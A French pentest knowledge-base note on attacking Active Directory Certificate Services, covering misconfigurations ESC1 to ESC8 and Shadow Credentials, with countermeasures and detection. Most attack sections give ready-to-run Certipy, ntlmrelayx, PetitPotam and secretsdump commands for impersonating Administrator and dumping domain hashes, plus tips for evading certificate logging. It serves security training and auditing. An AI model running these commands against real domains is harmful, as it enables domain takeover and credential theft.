---
title: "ADCS — Active Directory Certificate Services"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Active Directory"
tags: [adcs, active-directory, pki, certipy, esc1, esc8, certificates, pentest, sécurité]
date: "2026-03-22"
prerequis: ["[[Kerberos Attacks]]"]
---

# ADCS — Active Directory Certificate Services

En juin 2021, deux chercheurs de SpectreOps, Will Schroeder et Lee Christensen, publient un rapport de 140 pages au titre explicite : « Certified Pre-Owned ». Ils y montrent qu'un composant discret d'Active Directory, le service de certificats, est dans d'innombrables entreprises une voie directe et oubliée vers l'administrateur du domaine. Leur rapport nomme huit mauvaises configurations, ESC1 à ESC8, qui sont depuis devenues un passage obligé des tests d'intrusion. L'idée centrale est simple : dans un domaine, un certificat d'authentification vaut un mot de passe, et obtenir un certificat au nom d'un autre compte revient à obtenir un accès à ce compte.

ADCS (*Active Directory Certificate Services*) est l'infrastructure à clé publique intégrée à Active Directory. Des défauts de configuration des modèles de certificats (*Certificate Templates*) permettent d'obtenir des certificats au nom d'autres utilisateurs et d'usurper leur identité jusqu'à l'administrateur du domaine.

> [!important] Idée clé
> Toutes les variantes ESC1-ESC8 reviennent à la même question : **qui contrôle l'identité inscrite dans le certificat, et qui peut approuver la requête ?** Un certificat avec Client Authentication vaut un mot de passe — quiconque peut en obtenir un au nom d'un compte cible obtient l'équivalent d'un TGT pour ce compte.

> [!abstract] Définition — ADCS
> Infrastructure à clé publique intégrée à Active Directory, qui émet et gère les certificats servant notamment à l'authentification Kerberos via PKINIT. Sa sécurité repose sur les Certificate Templates, qui définissent qui peut s'enrôler et pour quelle identité, ainsi que sur les permissions de la CA. Une mauvaise configuration ESC1-ESC8 permet d'obtenir un certificat au nom d'un autre compte, donc un accès équivalent à son TGT.

## Concepts fondamentaux

Cinq notions suffisent à comprendre toutes les attaques qui suivent. L'**autorité de certification** (*Certificate Authority*, CA) émet les certificats ; dans un domaine, une *Enterprise CA* intégrée à Active Directory sert notamment à l'authentification Kerberos. Un **modèle de certificat** (*Certificate Template*) décrit ce qu'un certificat permet de faire et qui peut en demander : il définit les droits d'enrôlement, les usages autorisés et le mode de renseignement de l'identité.

Ces usages sont désignés par l'**EKU** (*Extended Key Usage*). Les deux qui comptent pour un attaquant sont *Client Authentication* et *Smart Card Logon*, qui permettent de s'authentifier dans l'annuaire ; *Any Purpose* autorise tout, et *SubCA* permet de signer d'autres certificats. L'identité portée par le certificat est, elle, inscrite dans le **SAN** (*Subject Alternative Name*) : si celui qui demande le certificat contrôle son SAN, il peut en réclamer un au nom de n'importe qui, administrateur compris. C'est la faille centrale.

Le lien avec l'authentification est assuré par **PKINIT**, l'extension de Kerberos qui accepte un certificat à la place d'un mot de passe : un certificat valide portant *Client Authentication* se convertit en un TGT Kerberos, et donc en un accès au compte visé.

## Reconnaissance avec Certipy

```bash
# Certipy — outil Python pour l'audit et l'exploitation ADCS
pip install certipy-ad

# Énumération des templates et CAs (sans authentification spéciale)
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1

# Sortie JSON + fichier BloodHound compatible
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1 \
    -json -bloodhound

# Lister seulement les templates vulnérables
certipy find -u alice@domaine.local -p 'Password123' -dc-ip 192.168.1.1 \
    -vulnerable -stdout

# Impacket — lister les CAs via LDAP
python3 -m impacket.examples.GetADUsers -all domaine.local/alice:Password123
```

```
Informations collectées :
  - Certificate Authorities (nom, DNS, flags)
  - Templates : EKU, msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag
  - Permissions : qui peut enroller, qui peut éditer les templates
  - Configurations à risque : ENROLLEE_SUPPLIES_SUBJECT, Any Purpose, no manager approval
```

## ESC1 — SAN arbitraire

La template autorise l'enrolleur à spécifier le SAN → usurpation d'identité.

```
Conditions :
  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT activé (msPKI-Certificate-Name-Flag: 1)
  EKU inclut Client Authentication ou Any Purpose
  Low-privileged users peuvent s'enroller
  Pas d'approbation manager requise

Impact : obtenir un certificat au nom de Domain Admin → s'authentifier en tant que DA
```

```bash
# Exploitation ESC1 avec Certipy
# 1. Demander un certificat au nom d'Administrator
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'VulnerableTemplate' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1

# → Génère administrator.pfx (certificat + clé privée)

# 2. Authentification Kerberos avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
# → Obtient le hash NTLM de Administrator ET un TGT

# 3. Utiliser le hash NTLM (Pass-the-Hash)
secretsdump.py -hashes :NTLM_HASH domaine.local/administrator@192.168.1.1
```

## ESC2 — Any Purpose EKU

```
Conditions :
  EKU = Any Purpose (2.5.29.37.0) ou pas d'EKU (unrestricted)
  Low-privileged users peuvent s'enroller

Impact : le certificat peut être utilisé pour tout, y compris l'auth client
→ Si SAN non contrôlable → pire que ESC1 pour les cas sans SAN
```

```bash
# ESC2 — demander pour soi-même (l'EKU Any Purpose permet l'auth)
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'AnyPurposeTemplate' \
    -dc-ip 192.168.1.1

certipy auth -pfx alice.pfx -dc-ip 192.168.1.1
```

## ESC3 — Agent d'enrollment

```
Conditions :
  Template A : EKU = Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
  Template B : autorise les enrollment agents → peut s'enroller pour d'autres

Impact : devenir enrollment agent → demander des certificats au nom d'autres utilisateurs
```

```bash
# Étape 1 — obtenir un certificat d'enrollment agent
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'EnrollmentAgent' \
    -dc-ip 192.168.1.1

# Étape 2 — utiliser ce certificat pour demander un cert au nom d'Administrator
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'TemplateB' \
    -on-behalf-of 'domaine\administrator' \
    -pfx alice.pfx \
    -dc-ip 192.168.1.1
```

## ESC4 — Contrôle de la template

```
Conditions :
  Un utilisateur non-privilégié a WriteProperty/WriteDacl/Owner sur une template

Impact : modifier la template pour la rendre vulnérable (ESC1)
→ Ajouter ENROLLEE_SUPPLIES_SUBJECT, supprimer la validation manager
```

```bash
# Modifier une template pour la rendre vulnérable
certipy template -u alice@domaine.local -p 'Password123' \
    -template 'TargetTemplate' \
    -save-old \
    -dc-ip 192.168.1.1

# Exploiter comme ESC1 ensuite
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'TargetTemplate' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1

# Restaurer la template originale après
certipy template -u alice@domaine.local -p 'Password123' \
    -template 'TargetTemplate' \
    -configuration TargetTemplate.json \
    -dc-ip 192.168.1.1
```

## ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2

```
Conditions :
  La CA a le flag EDITF_ATTRIBUTESUBJECTALTNAME2 activé
  → Permet de spécifier des SANs dans TOUTES les requêtes de certificats
    (même les templates sans ENROLLEE_SUPPLIES_SUBJECT)

Impact : demander un certificat pour n'importe quelle template avec un SAN arbitraire
```

```bash
# Détecter ESC6 dans le résultat de certipy find
# "User Specified SAN": True sous la CA

# Exploitation : similaire à ESC1 mais sur n'importe quelle template avec Client Auth
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -template 'User' \
    -upn 'administrator@domaine.local' \
    -dc-ip 192.168.1.1
```

## ESC7 — Permissions sur la CA elle-même

```
Conditions :
  Un utilisateur a ManageCA (ou ManageCertificates) sur la CA

Impact :
  ManageCA → activer EDITF_ATTRIBUTESUBJECTALTNAME2 → ESC6
  ManageCertificates → approuver des certificats en attente (pending requests)
```

```bash
# Activer ESC6 via ManageCA
certipy ca -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' \
    -enable-editf \
    -dc-ip 192.168.1.1

# Avec ManageCertificates — approuver une requête en attente (ESC7 variant 2)
# 1. Demander un certificat ESC1 (sans approbation auto)
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -template 'TemplateSensible' \
    -upn 'administrator@domaine.local'
# → Request ID: 42

# 2. Approuver la requête
certipy ca -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -issue-request 42 -dc-ip 192.168.1.1

# 3. Récupérer le certificat approuvé
certipy req -u alice@domaine.local -p 'Password123' \
    -ca 'DOMAINE-CA' -retrieve 42 -dc-ip 192.168.1.1
```

## ESC8 — NTLM Relay vers Web Enrollment (AD CS HTTP Endpoints)

```
Conditions :
  L'endpoint HTTP de la CA est exposé (certsrv)
  NTLM authentication activée (pas d'EPA — Extended Protection for Authentication)
  → Relay d'une authentification NTLM capturée vers cet endpoint

Impact : obtenir un certificat au nom de l'utilisateur dont l'authentification est relayée
         Si on relay DC$ → certificat machine du DC → DCSync
```

```bash
# ESC8 — NTLM Relay vers AD CS

# Étape 1 — démarrer ntlmrelayx en mode ADCS
impacket-ntlmrelayx -t http://ca.domaine.local/certsrv/certfnsh.asp \
    -smb2support --adcs \
    --template 'Machine'

# Étape 2 — forcer une authentification NTLM (Responder ou PetitPotam)
# PetitPotam — forcer le DC à s'authentifier
python3 PetitPotam.py -u alice -p 'Password123' attaquant.com dc01.domaine.local

# Étape 3 — récupérer le certificat en base64
# ntlmrelayx affiche : [*] Base64 certificate of user DC01$:  AAAA...

# Étape 4 — utiliser le certificat
echo "AAAA..." | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
# → Hash NTLM de DC01$ → DCSync

python3 secretsdump.py -hashes :HASH_NTLM_DC01 'domaine.local/DC01$@192.168.1.1'
```

## Shadow Credentials (attribut msDS-KeyCredentialLink)

```
Alternative aux certificats pour l'exploitation PKINIT :
  Si on a WriteProperty sur msDS-KeyCredentialLink d'un compte → ajouter une clé
  → S'authentifier via PKINIT avec cette clé → obtenir TGT + hash NTLM

Nécessite : Windows Server 2016+ avec ADCS installé
```

```bash
# Pywhisker — manipulation de msDS-KeyCredentialLink
python3 pywhisker.py -d domaine.local -u alice -p 'Password123' \
    --target Administrator --action add --dc-ip 192.168.1.1
# → Génère alice_to_administrator.pfx + password

certipy auth -pfx alice_to_administrator.pfx -dc-ip 192.168.1.1

# Certipy — shadow credentials intégré
certipy shadow auto -u alice@domaine.local -p 'Password123' \
    -account administrator -dc-ip 192.168.1.1
```

## Contre-mesures

La **protection des modèles** est la première ligne de défense, puisque c'est leur configuration qui ouvre la plupart des attaques. Il faut retirer le droit pour le demandeur de fixer lui-même l'identité du certificat (le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) sauf cas légitime, exiger l'approbation d'un responsable pour les modèles sensibles, auditer les ACL des modèles pour empêcher les utilisateurs ordinaires de les modifier, supprimer les modèles par défaut inutilisés et proscrire l'usage *Any Purpose* au profit d'un usage précis.

La **protection de la CA** vient ensuite : désactiver le drapeau `EDITF_ATTRIBUTESUBJECTALTNAME2` s'il n'est pas nécessaire (c'est lui qui rend possible ESC6), réserver les droits `ManageCA` et `ManageCertificates` aux seuls administrateurs de l'autorité, et surtout sécuriser le point d'enrôlement web en activant HTTPS et l'EPA, ce qui ferme la voie du relais NTLM (ESC8).

Côté **détection**, les signaux les plus parlants sont les demandes de certificat dont le SAN diffère de l'identité du demandeur, les modifications de modèles (événements 4899 et 4900) et l'usage de PKINIT par des comptes inhabituels. Un audit régulier avec `certipy find -vulnerable`, ou avec PingCastle et Purple Knight, permet de repérer les mauvaises configurations avant les attaquants.

## Pièges courants

> [!warning] Pièges courants
> - **ESC1 vs ESC6 — différence subtile** : ESC1 = template autorise SAN supply (`ENROLLEE_SUPPLIES_SUBJECT`). ESC6 = CA accepte SAN supply globalement (`EDITF_ATTRIBUTESUBJECTALTNAME2`). ESC6 est rare mais permet de bypass des templates non-ESC1.
> - **Manager Approval ou Authorized Signatures** : un template peut sembler vulnérable ESC1 mais nécessiter une approbation manuelle ou une signature d'enrollment agent. Lire la sortie complète de `certipy find`.
> - **Template `User` par défaut** : ne pas confondre avec un template custom modifiable. Les templates par défaut Microsoft sont généralement bien configurés, mais les templates dupliqués pour personnalisation finissent souvent en ESC1.
> - **Persistance via PKINIT** : un certificat émis pour un compte reste valide même si le mot de passe change (jusqu'à expiration du cert). `certipy auth` avec un certificat permet de récupérer le hash NT actuel à chaque utilisation.
> - **ESC8 nécessite SMB Signing désactivé sur le serveur ADCS** : si IIS sur l'ADCS est en HTTPS strict avec EPA, le relay HTTP → HTTPS échoue. Tester `ntlmrelayx --no-validate-privs`.
> - **SAN UPN vs SAN DNS** : pour s'authentifier comme un user, mettre `-upn user@cible.com`. Pour un compte machine, mettre `-dns COMPUTER.cible.com` ET `-upn COMPUTER$@cible.com`. Erreur classique.
> - **Certipy nécessite des heures synchronisées** : Kerberos exige une fenêtre de 5 minutes max d'écart. Si le Kali a une horloge décalée par rapport au DC, `certipy auth` échoue. `ntpdate dc.cible.com`.
> - **CRL et CT logs** : certains environnements monitoring loggent les certificats émis (Certificate Transparency interne). Émettre un cert "admin" = trace dans le CRL. Préférer Shadow Credentials qui ne passe pas par AD CS.
> - **DC Authentication template** : récupérer un cert via `DomainController` template = peut s'authentifier comme le DC$ → DCSync immédiat. Mais aussi très repérable (qui demande un cert DC ?).

> [!quiz] Quelle différence entre ESC1 et ESC6 ?
> ESC1 vient du template : le flag ENROLLEE_SUPPLIES_SUBJECT autorise le demandeur à choisir le SAN, mais seulement sur ce template. ESC6 vient de la CA : le flag EDITF_ATTRIBUTESUBJECTALTNAME2 accepte un SAN fourni par le demandeur dans toutes les requêtes, y compris sur des templates qui ne l'autorisent pas.
